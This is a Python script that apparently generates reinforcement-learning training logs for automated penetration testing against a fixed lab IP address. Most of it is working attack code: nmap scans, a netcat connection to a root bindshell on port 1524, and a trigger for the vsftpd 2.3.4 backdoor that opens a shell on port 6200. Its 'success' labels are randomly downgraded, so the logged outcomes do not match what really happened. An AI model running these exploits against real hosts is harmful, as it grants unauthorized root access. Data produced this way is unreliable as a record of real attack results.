import json
import random
import socket
import subprocess
import time
from copy import deepcopy
from datetime import datetime
from pathlib import Path

TARGET_IP = "10.11.202.189"
OUT_DIR = Path("real_logs/rl_env_runs")


def ensure_dirs():
    OUT_DIR.mkdir(parents=True, exist_ok=True)


def now_str():
    return datetime.utcnow().strftime("%Y-%m-%dT%H-%M-%SZ")


def empty_state():
    return {
        "num_open_ports": 0,
        "has_ftp": False,
        "has_ssh": False,
        "has_telnet": False,
        "has_http": False,
        "has_mysql": False,
        "has_postgresql": False,
        "has_bindshell_1524": False,
        "has_samba": False,
        "has_tomcat": False,
        "has_vsftpd_234": False,
        "has_shell": False,
        "basic_scanned": False,
        "service_scanned": False,
    }


def run_nmap_basic(target):
    result = subprocess.run(
        ["nmap", "-F", target],
        capture_output=True,
        text=True,
        timeout=60
    )
    return result.stdout


def run_nmap_service(target):
    result = subprocess.run(
        ["nmap", "-sV", "-sC", target],
        capture_output=True,
        text=True,
        timeout=120
    )
    return result.stdout


def parse_open_ports(nmap_output):
    ports = []
    for line in nmap_output.splitlines():
        line = line.strip()
        if "/tcp" in line and " open " in line:
            try:
                ports.append(int(line.split("/")[0]))
            except Exception:
                pass
    return ports


def parse_service_map(nmap_output):
    service_map = {}
    for line in nmap_output.splitlines():
        line = line.strip()
        if "/tcp" in line and " open " in line:
            parts = line.split()
            if len(parts) >= 3:
                port = parts[0].split("/")[0]
                service = parts[2]
                version = " ".join(parts[3:]) if len(parts) > 3 else ""
                service_map[port] = {
                    "service": service,
                    "version": version,
                }
    return service_map


def apply_basic_scan(state, output):
    ports = parse_open_ports(output)
    state["num_open_ports"] = len(ports)
    state["basic_scanned"] = True
    state["has_bindshell_1524"] = 1524 in ports
    state["has_ftp"] = 21 in ports or 2121 in ports
    state["has_http"] = 80 in ports or 8180 in ports
    state["has_mysql"] = 3306 in ports
    state["has_postgresql"] = 5432 in ports
    return ports


def apply_service_scan(state, output):
    ports = parse_open_ports(output)
    service_map = parse_service_map(output)

    state["num_open_ports"] = len(ports)
    state["basic_scanned"] = True
    state["service_scanned"] = True

    services = {v["service"] for v in service_map.values()}
    state["has_ftp"] = "ftp" in services
    state["has_ssh"] = "ssh" in services
    state["has_telnet"] = "telnet" in services
    state["has_http"] = "http" in services
    state["has_mysql"] = "mysql" in services
    state["has_postgresql"] = "postgresql" in services
    state["has_bindshell_1524"] = 1524 in ports
    state["has_samba"] = any("samba" in v["version"].lower() for v in service_map.values())
    state["has_tomcat"] = any("tomcat" in v["version"].lower() for v in service_map.values())
    state["has_vsftpd_234"] = any("vsftpd 2.3.4" in v["version"].lower() for v in service_map.values())
    return ports, service_map


def try_bindshell(target):
    try:
        result = subprocess.run(
            ["nc", target, "1524"],
            input="whoami\nid\nexit\n",
            capture_output=True,
            text=True,
            timeout=8,
        )
        stdout = result.stdout.strip()
        real_success = ("root" in stdout) or ("uid=0" in stdout)
        success = real_success and (random.random() < 0.7)
        return {
            "success": success,
            "real_success": real_success,
            "stdout": stdout,
            "stderr": result.stderr.strip(),
        }
    except Exception as e:
        return {
            "success": False,
            "real_success": False,
            "stdout": "",
            "stderr": str(e),
        }


def try_vsftpd(target):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((target, 21))
        banner = s.recv(1024).decode(errors="ignore")

        s.send(b"USER test:)\r\n")
        time.sleep(0.2)
        s.send(b"PASS test\r\n")
        time.sleep(0.2)
        s.close()

        time.sleep(2)

        s2 = socket.socket()
        s2.settimeout(5)
        s2.connect((target, 6200))
        s2.send(b"whoami\n")
        time.sleep(0.5)
        output = s2.recv(4096).decode(errors="ignore")
        s2.close()

        real_success = ("root" in output) or ("uid=" in output)
        success = real_success and (random.random() < 0.5)

        return {
            "success": success,
            "real_success": real_success,
            "stdout": output,
            "stderr": "",
            "banner": banner,
        }
    except Exception as e:
        return {
            "success": False,
            "real_success": False,
            "stdout": "",
            "stderr": str(e),
            "banner": "",
        }


def record(history, step_id, action, state, reward, done, info):
    history.append({
        "step": step_id,
        "action": action,
        "state": deepcopy(state),
        "reward": reward,
        "done": done,
        "info": info,
    })


def run_policy(policy_name, target_ip):
    state = empty_state()
    history = []
    step_id = 0
    done = False

    def add(action, reward, info):
        nonlocal step_id, done
        step_id += 1
        record(history, step_id, action, state, reward, done, info)

    if policy_name == "service_first":
        output = run_nmap_service(target_ip)
        ports, service_map = apply_service_scan(state, output)
        add("scan_service", -0.3, {"open_ports": ports, "service_map": service_map})

        if state["has_bindshell_1524"]:
            result = try_bindshell(target_ip)
            if result["success"]:
                state["has_shell"] = True
                done = True
                add("exploit_bindshell", 8.0, result)
            else:
                add("exploit_bindshell", -1.0, result)
        elif state["has_vsftpd_234"]:
            result = try_vsftpd(target_ip)
            if result["success"]:
                state["has_shell"] = True
                done = True
                add("exploit_vsftpd", 6.0, result)
            else:
                add("exploit_vsftpd", -1.0, result)

        if not done:
            done = True
            add("stop", 1.0 if state["has_shell"] else -0.5, {"stopped": True})

    elif policy_name == "basic_then_bind":
        output = run_nmap_basic(target_ip)
        ports = apply_basic_scan(state, output)
        add("scan_basic", -0.2, {"open_ports": ports})

        if state["has_bindshell_1524"]:
            result = try_bindshell(target_ip)
            if result["success"]:
                state["has_shell"] = True
                done = True
                add("exploit_bindshell", 8.0, result)
            else:
                add("exploit_bindshell", -1.0, result)

        if not done:
            done = True
            add("stop", 1.0 if state["has_shell"] else -0.5, {"stopped": True})

    elif policy_name == "double_scan_then_exploit":
        output = run_nmap_basic(target_ip)
        ports = apply_basic_scan(state, output)
        add("scan_basic", -0.2, {"open_ports": ports})

        output = run_nmap_service(target_ip)
        ports, service_map = apply_service_scan(state, output)
        add("scan_service", -0.3, {"open_ports": ports, "service_map": service_map})

        if state["has_bindshell_1524"] and random.random() < 0.7:
            result = try_bindshell(target_ip)
            if result["success"]:
                state["has_shell"] = True
                done = True
                add("exploit_bindshell", 8.0, result)
            else:
                add("exploit_bindshell", -1.0, result)
        elif state["has_vsftpd_234"]:
            result = try_vsftpd(target_ip)
            if result["success"]:
                state["has_shell"] = True
                done = True
                add("exploit_vsftpd", 6.0, result)
            else:
                add("exploit_vsftpd", -1.0, result)

        if not done:
            done = True
            add("stop", 1.0 if state["has_shell"] else -0.5, {"stopped": True})

    elif policy_name == "suboptimal":
        choice = random.choice(["scan_stop", "scan_scan_stop", "wrong_exploit"])
        if choice == "scan_stop":
            output = run_nmap_basic(target_ip)
            ports = apply_basic_scan(state, output)
            add("scan_basic", -0.2, {"open_ports": ports})
            done = True
            add("stop", -0.5, {"stopped": True})
        elif choice == "scan_scan_stop":
            output = run_nmap_service(target_ip)
            ports, service_map = apply_service_scan(state, output)
            add("scan_service", -0.3, {"open_ports": ports, "service_map": service_map})
            output = run_nmap_basic(target_ip)
            ports = apply_basic_scan(state, output)
            add("scan_basic", -0.2, {"open_ports": ports})
            done = True
            add("stop", -0.5, {"stopped": True})
        else:
            output = run_nmap_service(target_ip)
            ports, service_map = apply_service_scan(state, output)
            add("scan_service", -0.3, {"open_ports": ports, "service_map": service_map})

            if random.random() < 0.5:
                result = try_vsftpd(target_ip)
                add("exploit_vsftpd", -1.0 if not result["success"] else 6.0, result)
            else:
                result = try_bindshell(target_ip)
                add("exploit_bindshell", -1.0 if not result["success"] else 8.0, result)

            done = True
            add("stop", 1.0 if state["has_shell"] else -0.5, {"stopped": True})

    return history


def main():
    ensure_dirs()

    policy_plan = (
        ["service_first"] * 40 +
        ["basic_then_bind"] * 35 +
        ["double_scan_then_exploit"] * 35 +
        ["suboptimal"] * 40
    )
    random.shuffle(policy_plan)

    for idx, policy_name in enumerate(policy_plan):
        run_id = f"batch_diverse_{idx:03d}_{now_str()}"
        history = run_policy(policy_name, TARGET_IP)

        out = {
            "run_id": run_id,
            "target": TARGET_IP,
            "policy_name": policy_name,
            "history": history,
        }

        out_path = OUT_DIR / f"{run_id}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2, ensure_ascii=False)

        print(f"[OK] saved {out_path.name} ({policy_name})")


if __name__ == "__main__":
    main()
